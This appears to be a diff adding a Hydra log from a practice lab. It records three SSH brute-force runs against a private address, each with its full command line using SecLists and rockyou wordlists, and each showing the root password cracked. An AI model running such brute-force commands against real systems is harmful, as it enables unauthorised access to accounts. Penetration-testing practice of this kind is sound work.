@@ -1,0 +1,6 @@
+# Hydra v9.7 run at 2026-06-11 20:06:33 on 172.17.0.2 ssh (hydra -L /home/Zer0th/Desktop/Lists/SecLists/Usernames/top-usernames-shortlist.txt -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt -t 4 -v -o hydra.txt ssh://172.17.0.2)
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
+# Hydra v9.7 run at 2026-06-11 20:07:09 on 172.17.0.2 ssh (hydra -L /home/Zer0th/Desktop/Lists/SecLists/Usernames/top-usernames-shortlist.txt -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt -v -o hydra.txt ssh://172.17.0.2)
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
+# Hydra v9.7 run at 2026-06-11 20:07:52 on 172.17.0.2 ssh (hydra -L /home/Zer0th/Desktop/Lists/SecLists/Usernames/top-usernames-shortlist.txt -P /home/Zer0th/Desktop/Lists/Rockyou/rockyou.txt -o hydra.txt ssh://172.17.0.2)
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
